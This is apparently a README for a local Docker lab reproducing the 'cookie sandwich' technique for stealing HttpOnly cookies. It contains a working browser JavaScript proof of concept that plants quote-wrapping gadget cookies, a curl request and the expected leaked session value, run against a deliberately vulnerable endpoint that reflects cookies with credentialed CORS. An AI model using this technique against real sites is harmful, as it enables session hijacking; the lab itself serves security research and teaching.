# Cookie Sandwich Demo (Tomcat legacy + reflection)

Based on PortSwigger research: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique

## Build & Run (Docker)
```bash
docker build -t cookie-sandwich /Users/kesselbach/security-research/cookie-sandwich
docker run --rm -p 8091:8091 --name cookie-sandwich cookie-sandwich
```

## Endpoints
- /set-session — sets HttpOnly PHPSESSID=secret-session
- /json?session=ignored — reflects the 'session' cookie value into JSON (CORS allowed with credentials)

## PoC
1) Set HttpOnly cookie:
```bash
curl -i http://localhost:8091/set-session
```

2) Craft sandwich (curl or browser). For a browser same-origin PoC, open DevTools Console on http://localhost:8091 and run:
```javascript
(async () => {
  // Build the gadget cookies so the victim HttpOnly cookie sits between quotes
  document.cookie = `$Version=1; path=/json;`;     // 1) force legacy parsing
  document.cookie = `session="start; path=/json;`; // 2) open quote
  document.cookie = `dummy=end"; path=/;`;         // 3) close quote

  // Fetch reflective endpoint and print the result
  const r = await fetch('/json?session=ignored', { credentials: 'include' });
  console.log(await r.text());
})();
```

3) Fetch the reflected value (same-origin or CORS with credentials):
```bash
curl -s -H 'Cookie: $Version=1; session="start; PHPSESSID=secret-session; dummy=end"' \
     http://localhost:8091/json
```

Expected: JSON includes the concatenated value containing the HttpOnly cookie.

### Browser PoC (summary)

1) Visit http://localhost:8091/set-session to set PHPSESSID (HttpOnly).

2) In DevTools Console on the same origin, run the snippet above.

3) You should see output like:

```
{"session":"start; PHPSESSID=secret-session; dummy=end"}
```

